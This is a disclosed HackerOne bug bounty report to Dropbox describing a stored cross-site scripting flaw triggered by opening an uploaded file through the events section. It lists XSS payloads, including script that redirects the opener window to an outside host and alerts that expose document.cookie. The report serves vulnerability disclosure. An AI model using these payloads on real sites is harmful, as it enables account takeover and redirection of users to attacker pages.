@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/44739
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/aarmageddon
+ReportedTo:Dropbox(dropbox)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:05.03.2015 4:07:23
+
+Summary:
+
+Hi,
+
+This bug might interest you.
+
+In the process of testing , I uploaded a file which contained the scripts:
+
+<script>
+window.opener.location.replace('http://blackhorse.x10host.com/test.php');
+</script>
+<img src='2' onerror= "alert('XSS')" >
+<svg/onload=prompt(123);> 
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+On opening of the uploaded file through the events section, the XSS pop-ups come up and also the Dropbox user is redirected to the attackers site.
+
+One can share the link of the uploaded file with another dropbox user,once he adds it to its account and views it,his account can be compromised.
+
+Kindly please refer to the video attached.
+
+Thanks and Regards
+Nishant
